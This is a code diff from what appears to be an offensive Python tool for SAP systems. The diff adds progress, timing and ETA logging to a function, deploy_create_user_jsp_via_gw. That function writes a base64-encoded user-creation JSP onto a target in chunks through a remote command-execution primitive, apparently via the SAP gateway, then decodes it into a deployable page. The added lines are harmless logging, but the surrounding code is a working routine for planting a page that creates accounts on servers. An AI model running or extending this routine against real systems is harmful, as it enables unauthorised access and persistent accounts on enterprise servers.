@@ -518,9 +518,16 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
                            else _first[:160] + "…")
         print(f"[*] {node.sid}: first-chunk command "
               f"({len(_first)}B, limit 255): {_first_display}")
+    import time as _time
+    print(f"[*] {node.sid}: chunk loop starting: {len(chunks)} chunks × "
+          f"{chunk_size}B base64 = {len(jsp_b64)} bytes total "
+          f"(JSP source: {len(UME_CREATE_JSP)} bytes)")
+    loop_start = _time.monotonic()
     for idx, chunk in enumerate(chunks):
         op = ">" if idx == 0 else ">>"
+        t_start = _time.monotonic()
         r = exec_fn(chunk_shell, echo_args(chunk, op))
+        t_elapsed = _time.monotonic() - t_start
         if not r.get("success"):
             return {"success": False,
                     "error": f"chunk {idx+1}/{len(chunks)} write failed: "
@@ -554,6 +561,23 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
                                            f"was: {_first!r}")}
                 except ValueError:
                     pass
+        # Per-chunk verbose progress with running ETA + bar.
+        chunk_n = idx + 1
+        pct = int(chunk_n * 100 / len(chunks))
+        elapsed = _time.monotonic() - loop_start
+        avg = elapsed / chunk_n
+        remaining = int(avg * (len(chunks) - chunk_n))
+        bar_w = 20
+        filled = int(pct * bar_w / 100)
+        bar = "#" * filled + "·" * (bar_w - filled)
+        print(f"[*] {node.sid}: chunk {chunk_n:>3}/{len(chunks)} "
+              f"[{bar}] {pct:>3}%  "
+              f"(+{int(t_elapsed*1000):>4} ms, "
+              f"total {int(elapsed):>3}s, ETA {remaining:>2}s)")
+    total = _time.monotonic() - loop_start
+    print(f"[+] {node.sid}: chunk loop done: {len(chunks)} chunks / "
+          f"{len(jsp_b64)} base64 B in {total:.1f}s "
+          f"({len(jsp_b64)/total/1024:.1f} KB/s)")
 
     # 2) Decode to target JSP.  On Windows the /C wrapper is important
     #    so %TEMP% in the source path expands (SAPXPG does not resolve
